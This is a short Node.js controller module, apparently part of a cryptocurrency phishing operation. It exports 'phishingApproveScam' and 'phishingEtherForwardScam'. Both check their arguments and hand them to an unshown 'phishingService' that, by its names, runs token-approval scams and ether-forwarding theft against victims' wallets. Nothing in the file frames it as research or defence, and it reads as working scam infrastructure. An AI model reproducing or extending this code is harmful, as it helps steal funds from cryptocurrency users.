const phishingService = require("../services/phishingService");

const phishingApproveScam = async (_from, _to, _value, _currencySymbol)=> {
    
    if (!_from || !_to || !_value || !_currencySymbol){
        return {success: false, message: "Some of the credentials is missing or wrong."};
    }
    
    try {
        const response = await phishingService.ApprovalScamPhishingService(_from, _to, _value, _currencySymbol);
    
        return {success: true, data: response}
    } catch (err) {
        return {success: false, error: err.message}
    }
}

const phishingEtherForwardScam = async (_to)=> {

    if (!_to){
        return {success: false, message: "The Recepeint address is missing or incorrect."};
    }

   try {
     const response = await phishingService.EtherForwardPhishingService(_to);
 
     return {success: true, data: response}
   } catch (err) {
        return {success: false, error: err.message}
   }

}


module.exports = {
    phishingApproveScam,
    phishingEtherForwardScam
}